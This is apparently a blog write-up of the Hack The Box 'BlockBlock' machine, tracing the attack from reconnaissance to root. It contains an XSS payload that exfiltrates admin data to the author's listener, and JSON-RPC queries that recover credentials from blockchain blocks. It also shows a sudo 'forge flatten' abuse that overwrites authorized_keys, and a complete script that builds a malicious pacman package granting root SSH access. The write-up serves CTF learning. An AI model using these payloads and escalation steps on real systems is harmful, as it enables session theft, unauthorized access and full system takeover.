---
title: "BlockBlock Walkthrough(Hack The Box)"
date: 2025-03-29
draft: true
description: "Awesome Walkthrough"
tags: ["Hard", "Linux", "Hack The Box", "hacking", "Web3", "Block Chain", "Walkthrough"]
---
## Reconnaissance 
- On scanning with Nmap, it found two ports open 80 and 22-ssh 
- First impression of the web is, It is a Web3 and a chat app. As soon as I open It I could see it.
![Pasted image 20250106030842.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250106030842.png?raw=true)
- I can easily get that this page is using Ethereum
![Pasted image 20250105224629.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250105224629.png?raw=true)
- Interesting isn't it, So I Created an account and logged in 
- Has a secure and cool interface to chat
![Pasted image 20250106000441.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250106000441.png?raw=true)
- The chats data are stored using Ethereum in Blocks
- Scooped around a little bit and found `/admin` page but with no access for us
- The "Report User" button seems to be little suspicious cause the website is well built but not the report button, It has traditional alert pop up.
![Pasted image 20250106000810.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250106000810.png?raw=true)

## Enumeration
- Turns out the `Report User` button functionality is vulnerable to XSS
- The stupid admin is clicking around the links. 
![clicking](https://media.giphy.com/media/rVc6tckXu3uF0eMOh1/giphy.gif?cid=790b7611jjcpkblh86k7fg377z1hb32pub6ivil3ufcflldq&ep=v1_gifs_search&rid=giphy.gif&ct=g)
- But the weird thing here is, Admin is only clicking from alert boxes not just the simple URL/links
- So I made a XSS payload with the help of chatGPT to exfiltrate some data
```js
<img src=x onerror="fetch('http://10.10.11.43/api/info').then(response => {return response.text();}).then(dataFromA => {return fetch(`http://10.10.14.12:8000/?d=${dataFromA}`)})">
```
- This payload fetches data from `/api/info` and then returns it to my server. This is simple yet effective payload.
![Pasted image 20250106001445.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250106001445.png?raw=true)
- Got the admin cookie and tried to access the `/admin` page.
- In the Source of admin page, found some interesting endpoints
![Pasted image 20250106001604.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250106001604.png?raw=true)
- This `json-rpc` endpoint can query more, like hashes and stuff
- This [Documentation](https://ethereum.org/en/developers/docs/apis/json-rpc/) has more info about the stuffs that can be done with this endpoint
- But particularly this one catches my attention
![Pasted image 20250106002345.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250106002345.png?raw=true)
- This parameter `eth_blockNumber` gets the recent block that saved have been saved.
- I tested the endpoint `json-rpc` with this `eth_blockNumber`
- Seems like the value next to the `params` value is a boolean
![Pasted image 20250106002939.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250106002939.png?raw=true)
- The `Params` value is the the value for the block the request data from it seemed interesting
- **Request**
```json
{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["0x3",true],"id":1}
```
- **Response**
```json
{"id":1,"jsonrpc":"2.0","result":{"baseFeePerGas":"0x2ed9c9d5","blobGasUsed":"0x0","difficulty":"0x0","excessBlobGas":"0x0","extraData":"0x","gasLimit":"0x1c9c380","gasUsed":"0x5208","hash":"0x3a4e1469d5807e4c2aabf2a929f91beb2bc905e079fc5889a476dcf65c716fa2","logsBloom":"0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000","miner":"0x0000000000000000000000000000000000000000","mixHash":"0x0000000000000000000000000000000000000000000000000000000000000000","nonce":"0x0000000000000000","number":"0x3","parentHash":"0xbb0a3238a043aca148c25eca9495f869c9d77eb4e09aa10d84c7671bf4c3bed1","receiptsRoot":"0x1ee3363046236ead36f002663ef78ab52f67ac34d6f1f88e10d3880f599467fe","sha3Uncles":"0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347","size":"0x27a","stateRoot":"0xbfe4686238e176ede330654210feb1bb7498d93bb02d29f260f8f196a96a606e","timestamp":"0x677ac8f9","totalDifficulty":"0x0","transactions":[{"accessList":[],"blockHash":"0x3a4e1469d5807e4c2aabf2a929f91beb2bc905e079fc5889a476dcf65c716fa2","blockNumber":"0x3","chainId":"0x7a69","from":"0xb795dc8a5674250b602418e7f804cd162f03338b","gas":"0x5209","gasPrice":"0x2ed9c9d5","hash":"0xeebe19598f35ccc154e96861f410a90f6a76ab9aeec456a880e6cb8b571faf62","input":"0x","maxFeePerGas":"0x5db393aa","maxPriorityFeePerGas":"0x0","nonce":"0x2","r":"0xa1573f48dd6f63e72b9ce8c6227179a139d59870f4d16e874e88d4b93cba095c","s":"0x79d8d9216eceefec581ef607b2aa74211ce4bdb66171882834b5ab8d117b53d6","to":"0x6b388912df3e0c179384903efa36daf47738ec91","transactionIndex":"0x0","type":"0x2","v":"0x0","value":"0x2540be400","yParity":"0x0"}],"transactionsRoot":"0x231277c116523613e92267b48237bd95ea4da316b3b07fa1bb3ad86de49caf78","uncles":[]}}
```
- But this response is literally a blob of text with multiple values init which mean nothing to us.

## Exploitation
- As this a array, down here by changing the value of `i` like `1,2 or 3`, we can explore other blocks data 
```bash
"params":["0xi",true]
```
- Likewise got a `input` value on the response from my request. Which is different from my previous requests
![Pasted image 20250106003937.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250106003937.png?raw=true)
- After trying many Ethereum input data Decoders online, It seemed like hex to me so decoded it with the help of Cyberchef and got a password and username from it.
![Pasted image 20250106004230.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250106004230.png?raw=true)

![hidden](https://media.giphy.com/media/7BCoU3NNe1hwHZb1o9/giphy.gif?cid=790b7611xtx75fmm7kdpd7dldwkz44dwoq3rpzy05nls9fef&ep=v1_gifs_search&rid=giphy.gif&ct=g)
- Logged in using SSH and got the {{< keyword >}} User flag {{< /keyword >}}
![Pasted image 20250106004313.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250106004313.png?raw=true)

## Pivoting
- User `keira` can sudo as user `paul` on a binary called `forge`
![Pasted image 20250106004658.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250107181255.png?raw=true)
- `forge` is the command-line interface (CLI) tool for interacting with a specific framework or environment. It could relate to tools like `Foundry` for Ethereum development and that's my speculation at first or any it could be someother CLI-based tool with the name `forge`
- After hours of research I found that I can use `flatten` option in forge to write on any file.
-  When someone login in using SSH by a private key, SSH checks the authenticity of the key with its public key on the system.
- Here using the `flatten` option in forge, I can simply write the Public key of the user `keira` to the user `paul`'s public key in his home directory. After that on passing the private key of the user `keira` I can get ssh shell as user `paul` 
#### Step-1
	- On the system created ssh keys using this command
```bash
ssh-keygen
```
![Pasted image 20250107181255.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250107181255.png?raw=true)

#### Step-2

- Copy the public key of user `keira` to the `/tmp` folder and Give all necessary permissions.
```
cp .ssh/id_ed25519.pub /tmp/pub
```

```
chmod 644 /tmp/pub
```
![Pasted image 20250107183317.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250107183317.png?raw=true)

![nothing](https://media1.tenor.com/m/PhVWidvw9k4AAAAC/normal-doggo.gif)

#### Step-3
- Exploit it using the `flatten` option to write the public key to the user `paul`'s home directory in this `.ssh/authorized_keys` file

```bash
sudo -u paul /home/paul/.foundry/bin/forge flatten /tmp/pub -o /home/paul/.ssh/authorized_keys
```
![Pasted image 20250107183403.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250107183403.png?raw=true)

#### Step-4
- Now share the private key to the attacker's system and login using the private key as user `paul`
```bash
python3 -m http.server --directory .ssh/
```
![Pasted image 20250107183432.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250107183432.png?raw=true)
- Got access as user `paul`
![Pasted image 20250107183526.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250107183526.png?raw=true)

## Privilege Escalation
- As we can see user `paul` has SUDO privilege to run `pacman`
- To exploit this, we can create an own malicious package and install it using pacman.
- Initially I was struggling cause of my malicious package that I made is not working as intended.
- Then after that I used a script from my friend's blog [TheCyberSimon](http://thecybersimon.com/posts/Privilege-Escalation-via-Pacman/). Kindly support his blog too
- This time the package works
```bash
#!/bin/bash

# Create a working directory
mkdir priv && cd priv

# Generate PKGBUILD file
cat <<EOF >PKGBUILD
pkgname=privesc
pkgver=1.0
pkgrel=1
pkgdesc="Privilege Escalation Package"
arch=('any')
url="http://example.com"
license=('GPL')
depends=()
makedepends=()
source=('authorized_keys')
sha256sums=('SKIP')
package() {
  install -Dm755 "\$srcdir/authorized_keys" "\$pkgdir/root/.ssh/authorized_keys"
}
EOF

# Generate SSH keys
ssh-keygen -t rsa -b 4096 -f id_rsa -N ""
mv id_rsa.pub authorized_keys

# Build the malicious package
makepkg

# Output message
echo "Malicious package created! Run the following command to deploy:"
echo "sudo pacman -U $(pwd)/privesc-1.0-1-any.pkg.tar.zst"
echo "Don't forget to secure your private key: id_rsa
```
- This script is quite simple, the script first makes a directory named `priv` then creates a file named `PKGBUILD` with malicious code.
- The malicious code will write the `root` user's `authorized_keys` file with our public key
- This script will also create ssh key for the current system in the current directory without any password and then it will replace the public key to `authorized_keys`
- Then It will execute this command `makepkg`. Which will compile the malicious package and will also move the newly created key.
![Pasted image 20250107185332.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250107185332.png?raw=true)
- Transfer this malicious package to the target's system and install it using `sudo`
![Pasted image 20250107185451.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250107185451.png?raw=true)
- On the host system give all the necessary permissions to our private key and use it to login
- System have been {{< keyword >}} Rooted successfully {{< /keyword >}}
![Pasted image 20250107185638.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250107185638.png?raw=true)

## Summary
First, the initial scan showed the usual suspects: SSH and a web server on port 80. Right away, the web app looked like a Web3 chat thing powered by Ethereum, which was a bit different. I made an account and poked around. The chat was there, and I noticed this "Report User" button that felt a bit off. Found an admin page too, but no luck getting in at that point.

Next came the poking and prodding. That "Report User" button turned out to be a sweet spot for XSS. The admin on the other end seemed keen on clicking my crafted alerts. Used ChatGPT to whip up a payload to snag their cookie – and it worked like a charm, giving me access to the /admin page. Digging through the source there, I spotted a json-rpc endpoint. That got my attention, especially the eth_blockNumber function. I started messing with the block numbers and noticed I could pull data. One of those inputs looked like hex, so a quick decode with Cyberchef later, and boom, username and password.Time to get in. I took those credentials straight to SSH and landed a shell.Got the user flag, easy enough.

Now for the real fun – getting root. I saw that user keira could run forge as sudo for paul. Did a bit of digging on forge and saw the flatten option could write files. So, I generated some SSH keys, dropped keira's public key in /tmp, and then used forge flatten to overwrite paul's authorized_keys with it. That gave me SSH access as paul using keira's private key. From there, I noticed paul could run pacman with sudo. I cooked up a simple script to create a malicious package that would replace root's authorized_keys with my own public key. After transferring it over and installing with sudo pacman, I logged in as root with my key and grabbed the root flag. Another one down.

{{< typeit >}} This box is full of new things as it featured block chain, I learnt a lot from this box and I expect the same for you. Don't forget to check my other posts, Until nextime ;) {{< /typeit >}}

![bye](https://media.tenor.com/mTDKH-ocdH4AAAAi/%E3%81%BE%E3%81%9F%E3%81%AD-%E3%81%BE%E3%81%9F%E4%BC%9A%E3%81%8A%E3%81%86.gif)
